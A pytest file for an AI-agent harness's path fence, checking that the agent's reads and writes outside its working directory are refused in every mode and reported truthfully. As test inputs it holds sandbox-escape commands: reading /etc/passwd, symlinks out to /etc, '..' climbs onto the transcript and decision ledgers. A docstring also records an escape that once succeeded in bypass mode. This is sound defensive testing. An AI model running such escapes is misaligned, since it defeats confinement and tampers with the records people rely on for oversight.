# Who decided is on the record honestly
# ---------------------------------------------------------------------------


def _decided_by(fenced: _Mirror) -> list[str]:
    session = fenced.mirror._session
    assert session is not None
    return [record.decided_by for record in session.decision_sink.read()]


async def test_a_refused_write_is_the_fences_decision_and_the_model_is_told(
    fenced: _Mirror,
) -> None:
    """The refusal of a write outside the folder is not a reader's ``reject``:
    the decision ledger names the fence, and the model is handed the sentence
    (a reason-bearing reject is recoverable; a bare one ends the turn)."""
    target = str(fenced.workspace / "src" / "app.py")
    ask = _write_ask(raw=target, request_id="req-fence")

    assert await fenced.ask(ask) == "reject_once"

    assert fenced.adapter.permission_reply_reasons == [
        (
            "req-fence",
            fence_reason(writing=True, target=target, boundary=fenced.mirror.working_dir),
        )
    ]
    assert fenced.adapter.cancel_count == 0
    assert _decided_by(fenced) == ["fence"]


@pytest.mark.parametrize(
    ("effect", "kind", "destination", "operation", "opposite"),
    [
        pytest.param("write", "edit", "/tmp/escape.txt", "write", "read", id="a-write-off-the-box"),
        pytest.param("read", "read", "/etc/passwd", "read", "write", id="a-read-off-the-box"),
    ],
)
async def test_the_model_is_told_who_refused_and_which_way_out(
    fenced: _Mirror, effect: str, kind: str, destination: str, operation: str, opposite: str
) -> None:
    """The sentence the model reasons from has to match the record.

    The fence decides these without asking anyone, so calling it a person's
    rejection invents a human who was never in the loop; describing a refused
    write as "I can only read files here" reads as a missing capability rather
    than a boundary; and a refusal that names no reachable location leaves the
    model with nothing to try next.
    """
    ask = _write_ask(raw=destination, kind=kind, effect=effect, request_id=f"req-{operation}")
    # Either way out is the chat's root: a cloud chat reads and writes its
    # working directory, and the box's project is not a place it can type.
    boundary = fenced.mirror.working_dir

    assert await fenced.ask(ask) == "reject_once"

    (_, reason), *rest = fenced.adapter.permission_reply_reasons
    assert rest == []
    assert reason == fence_reason(writing=effect == "write", target=destination, boundary=boundary)
    assert reason is not None
    assert "workspace policy refused this " + operation in reason
    assert "user" not in reason and "rejected" not in reason
    assert f"this {opposite}" not in reason
    assert destination in reason and str(boundary) in reason
    assert _decided_by(fenced) == ["fence"]


@pytest.mark.parametrize("route", ["harness-chokepoint", "mirror-resolver"])
@pytest.mark.parametrize(
    ("command", "classified", "target", "writing"),
    [
        pytest.param(
            "uname -a; cat /proc/version; dmesg 2>/dev/null | head -3; id; pwd",
            "write",
            "/proc/version",
            False,
            id="a-read-in-a-command-the-classifier-calls-a-write",
        ),
        pytest.param(
            "cat /proc/version; cp notes.md out.txt",
            "write",
            "/proc/version",
            False,
            id="a-read-beside-a-write-inside-the-folder",
        ),
        pytest.param(
            "cat notes.md 2>/dev/null | tee /tmp/escape.txt",
            "write",
            "/tmp/escape.txt",
            True,
            id="a-real-write-is-still-told-as-one",
        ),
    ],
)
async def test_a_shell_refusal_names_the_operation_the_command_does_to_that_location(
    fenced: _Mirror, route: str, command: str, classified: str, target: str, writing: bool
) -> None:
    """A cloud chat in ``bypass`` ran a system survey whose ``dmesg`` is in no
    table, so the classifier called the whole command a write; the fence then
    caught ``/proc/version``, a word ``cat`` only reads, and the model was told
    "refused this write ... write inside the sandbox instead". Which sentence it
    gets follows what the command does to the location that was refused, on
    the harness's chokepoint (where a bypass chat's asks are decided) and on the
    mirror's own resolver alike."""
    mirror = fenced.mirror
    session = mirror._session
    assert session is not None
    if route == "harness-chokepoint":
        session._path_fence = PathFence(
            escape=mirror._fence_escape,
            reason=mirror._fence_reason,
            session=mirror.session_fence,
            must_ask=mirror._fence_must_ask,
        )
        session.set_permission_mode("bypass")
        mirror._mode = "bypass"
    # The ask carries the classifier's own verdict on the whole command, as
    # the harness's does.
    effect = str(classify_command(command).effect)
    assert effect == classified
    ask = _write_ask(
        raw=command, kind="bash", capability="shell", effect=effect, request_id="req-survey"
    )
    boundary = mirror.working_dir

    assert await fenced.ask(ask) == "reject_once"

    (_, reason), *rest = fenced.adapter.permission_reply_reasons
    assert rest == []
    assert reason == fence_reason(writing=writing, target=target, boundary=boundary)
    assert _decided_by(fenced) == ["fence"]


@pytest.mark.parametrize("classified", [True, False])
async def test_the_classifiers_word_answers_only_where_no_verdict_names_the_location(
    fenced: _Mirror, classified: bool
) -> None:
    """The verdict decides the operation for the location it caught, whatever
    the classifier said; a location it did not catch, or none at all, keeps
    the classifier's word."""
    judge = fenced.mirror.session_fence
    ask = _write_ask(raw="cat /proc/version; dmesg", kind="bash", capability="shell")

    assert judge.refuses_a_write(ask, "/proc/version", classified) is False
    assert judge.refuses_a_write(ask, "/not/the/caught/location", classified) is classified
    assert judge.refuses_a_write(ask, "", classified) is classified


async def test_a_parked_ask_answered_over_the_relay_reaches_the_tool_as_the_readers(
    fenced: _Mirror,
) -> None:
    """In ``default`` an ask the rules put to a person waits for the reader;
    nothing answers it in the meantime, and the relayed answer is what the tool
    gets — recorded as the person's, with no reason attached."""
    ask = _write_ask(
        raw=str(fenced.workspace / "src" / "app.py"),
        effect="read",
        kind="read",
        request_id="req-park",
    )

    assert await fenced.ask(ask) == "parked"
    await asyncio.sleep(0.2)
    assert fenced.adapter.permission_replies == [], "nobody answered, so nothing was replied"

    fenced.mirror._answer_interrupt("req-park", {"option_id": "allow_once"})
    async with asyncio.timeout(5.0):
        await fenced.adapter.wait_for_permission_reply("req-park", "allow_once")
    assert fenced.adapter.permission_replies == [("req-park", "allow_once")]
    assert fenced.adapter.permission_reply_reasons == [("req-park", None)]
    assert _decided_by(fenced) == ["human"]


# ---------------------------------------------------------------------------
# A parked ask is announced as the readers' to answer
# ---------------------------------------------------------------------------


async def test_a_parked_ask_is_announced_to_the_readers_as_theirs_to_answer(
    fenced: _Mirror,
) -> None:
    """The harness appends its ``permission.request`` before the policy runs, so
    that entry alone never tells a browser a person is being asked — the web
    chat renders decision controls only for an ask tagged ``prompting``, the
    tag the editor's host puts on when the daemon's broker reaches it. On the
    box the mirror is that broker's human channel, so the moment it parks an
    ask it must put the same tag on the wire, under its own event id. Without
    it a ``default``-mode write showed its diff and no Allow, and the turn
    ran its whole wall clock down waiting for a click nobody could make.
    """
    ask = _write_ask(raw="notes.txt", request_id="req-announced")
    assert await fenced.ask(ask) == "parked"

    on_wire = await fenced.asks("req-announced", expected=2)
    tagged = [e for e in on_wire if e["payload"].get("prompting") is True]
    untagged = [e for e in on_wire if "prompting" not in e["payload"]]
    assert len(untagged) == 1, "the harness's own append still reaches the transcript once"
    assert len(tagged) == 1, "and the mirror announces the parked ask exactly once"
    assert len({e["event_id"] for e in on_wire}) == 2, "under an id the server will not dedupe"
    announced, original = tagged[0]["payload"], untagged[0]["payload"]
    # Everything a card is built from rides the announcement too, so a browser
    # that sees it before the harness's entry can still raise the ask whole.
    for key in ("request_id", "tool_call_id", "canonical_kind", "options", "subject"):
        assert announced[key] == original[key], key
    assert announced["event_type"] == "permission.request"
    assert tagged[0]["role"] == untagged[0]["role"]


async def test_an_ask_the_fence_turned_away_is_never_announced(fenced: _Mirror) -> None:
    """The tag means "yours to answer". A write the fence refused was never
    parked on anyone, so tagging it would raise controls for an ask the box has
    already settled — and a click on those the mirror ignores as no such ask
    outstanding.
    """
    # The customer's project: inside the workspace, outside the chat's folder.
    ask = _write_ask(raw=str(fenced.workspace / "src" / "app.py"), request_id="req-fenced")
    assert await fenced.ask(ask) == "reject_once"
    assert fenced.mirror.pending_interrupts == []

    on_wire = await fenced.asks("req-fenced", expected=2)
    assert [e["payload"].get("prompting") for e in on_wire] == [None], (
        "only the harness's own append is on the wire"
    )


async def test_the_reader_may_raise_the_chat_to_auto(fenced: _Mirror) -> None:
    """``auto`` is the ceiling a reader raises a chat to when the model needs a
    request the analyst stances refuse outright: the box adopts it like any
    other stance, and the session runs in it from the next ask on."""
    fenced.mirror._mode = "read_only"
    fenced.mirror._session.set_permission_mode("read_only")  # type: ignore[union-attr]

    await fenced.mirror._on_mode({"kind": "mode", "mode": "auto"})

    assert fenced.mirror.permission_mode == "auto"
    assert fenced.mirror._session.permission_mode == "auto"  # type: ignore[union-attr]


def test_a_chat_row_that_says_auto_resumes_in_auto() -> None:
    from alkera_cli.cloud.service import _stored_mode

    assert _stored_mode("auto") == "auto"
    assert _stored_mode("accept_edits") == "read_only"


# ---------------------------------------------------------------------------
# A climb out of the working directory
# ---------------------------------------------------------------------------


def _climbing_box(fenced: _Mirror) -> Path:
    """The chat's records beside its working directory, a sibling chat's file
    and a link out to ``/etc``, laid out the way a cloud box lays them out."""
    working = fenced.mirror.working_dir
    folder = fenced.mirror.chat_folder
    for record in ("chat.jsonl", "decisions.jsonl", "cost_ledger.jsonl"):
        (folder / record).write_text("{}\n")
    (folder.parent / OTHER_CHAT / "x").write_text("theirs")
    (working / "a").mkdir(exist_ok=True)
    (working / "b.txt").write_text("mine")
    link = working / "link"
    if not link.exists():
        link.symlink_to("/etc")
    return working


@pytest.mark.parametrize(
    ("command", "escapes"),
    [
        pytest.param("echo x > ../outside.txt", True, id="a-redirect-one-level-up"),
        pytest.param("echo x > ../chat.jsonl", True, id="a-redirect-onto-the-transcript"),
        pytest.param("echo x >> ../cost_ledger.jsonl", True, id="an-append-onto-the-ledger"),
        pytest.param("cp b.txt ../decisions.jsonl", True, id="a-copy-onto-the-decisions"),
        pytest.param("cat ../../x", True, id="a-read-two-levels-up"),
        pytest.param(f"cat ../../{OTHER_CHAT}/x", True, id="a-sibling-chats-file"),
        pytest.param("ls ..", True, id="a-listing-of-the-chat-folder"),
        pytest.param("ls ../..", True, id="a-listing-of-every-chat"),
        pytest.param("cd .. && ls", True, id="a-cd-out-then-a-listing"),
        pytest.param("cat link/passwd", True, id="a-link-inside-that-points-out"),
        pytest.param("echo x > link/x", True, id="a-write-through-a-link-that-points-out"),
        pytest.param("cat ./a/../b.txt", False, id="a-dotdot-that-stays-inside"),
        pytest.param("echo x > ./a/../c.txt", False, id="a-write-whose-dotdot-stays-inside"),
        pytest.param('echo "version 1.2.."', False, id="dots-in-a-string-are-no-path"),
        pytest.param("echo x > notes.txt", False, id="a-plain-write-in-the-working-dir"),
    ],
)
def test_a_climb_out_of_the_working_directory_is_judged_where_it_lands(
    fenced: _Mirror, command: str, escapes: bool
) -> None:
    """The judge the box actually runs — the mirror's own bound, over the
    working directory the agent runs in — refuses every ``..`` and every link
    that lands outside that directory, whether the command reads or writes,
    and lets a ``..`` that folds back inside through."""
    working = _climbing_box(fenced)

    verdict = fenced.mirror.session_fence.judge_shell(command, cwd=working)

    assert verdict.escaped is escapes, verdict


@pytest.mark.parametrize("mode", ["default", "auto", "bypass"])
async def test_a_redirect_beside_the_chats_records_is_refused_in_every_mode(
    fenced: _Mirror, mode: str
) -> None:
    """The self-test's escape: ``echo would-write > ../outside.txt`` ran with
    exit 0 in bypass and landed next to the transcript. The mode hands over the
    asking, never the bound."""
    _climbing_box(fenced)
    fenced.mirror._mode = mode  # type: ignore[assignment]
    command = "echo would-write > ../outside.txt"

    answer = await fenced.ask(
        _write_ask(raw=command, kind="bash", capability="shell", request_id=f"req-up-{mode}")
    )

    assert answer == "reject_once"
    assert fenced.notes() == [f"{OUTSIDE_FOLDER}\n{quote_statement('../outside.txt')}"]
    assert not (fenced.mirror.chat_folder / "outside.txt").exists()


async def test_the_in_tool_shell_gate_refuses_the_climb_in_bypass(fenced: _Mirror) -> None:
    """The parent-hosted ``bash`` is judged by its own gate over the session's
    bound, not by an ask: a read and a write that climb out of the working
    directory are refused there too, with the fence's sentence, in bypass."""
    from alkera_cli.plugins.plugin_base.permissions import DecisionSink, gate_shell_action
    from alkera_cli.plugins.plugin_base.permissions.gate import GateBinding

    working = _climbing_box(fenced)
    binding = GateBinding(
        decision_sink=DecisionSink(fenced.workspace / ".alkera"),
        broker=None,
        fence=fenced.mirror.session_fence,
    )

    for command, operation in (
        ("echo would-write > ../outside.txt", "write"),
        ("ls ..", "read"),
        ("cat ../chat.jsonl", "read"),
    ):
        result = await gate_shell_action(command, mode="bypass", binding=binding, cwd=working)
        assert result.allowed is False, command
        assert result.reason is not None
        assert f"The workspace policy refused this {operation}" in result.reason, result.reason

    inside = await gate_shell_action(
        "cat ./a/../b.txt", mode="bypass", binding=binding, cwd=working
    )
    assert inside.allowed is True


@pytest.mark.parametrize(
    ("name", "escapes"),
    [
        pytest.param("../chat.jsonl", True, id="the-transcript-beside-the-working-dir"),
        pytest.param("../outside.txt", True, id="a-new-file-beside-the-transcript"),
        pytest.param("link/hosts", True, id="through-a-link-that-points-out"),
        pytest.param("a/../b.txt", False, id="a-dotdot-that-stays-inside"),
    ],
)
async def test_a_file_tool_write_is_bounded_by_the_working_directory(
    fenced: _Mirror, name: str, escapes: bool
) -> None:
    """``write`` / ``edit`` asks name absolute paths the harness resolved from
    where the agent runs; the same climb is refused for them."""
    working = _climbing_box(fenced)
    target = os.path.join(str(working), name)

    verdict = fenced.mirror.session_fence.judge_ask(
        _write_ask(raw=target, request_id="req-file"), writing=True
    )

    assert verdict.escaped is escapes, verdict


def test_a_workdir_through_a_link_that_points_out_is_refused(tmp_path: Path) -> None:
    """The bash tool's ``workdir`` is confined with links followed: a name
    inside the working directory that points outside it is outside."""
    from alkera_cli.plugins.plugin_base.bash_exec import confine_under_root
    from alkera_cli.plugins.plugin_base.tool import ToolError

    root = tmp_path / "scratch"
    (root / "sub").mkdir(parents=True)
    (root / "link").symlink_to(tmp_path)

    assert confine_under_root("sub/../sub", root, label="workdir") == root / "sub"
    with pytest.raises(ToolError, match="outside the workspace"):
        confine_under_root("link", root, label="workdir")
    with pytest.raises(ToolError, match="outside the workspace"):
        confine_under_root("..", root, label="workdir")
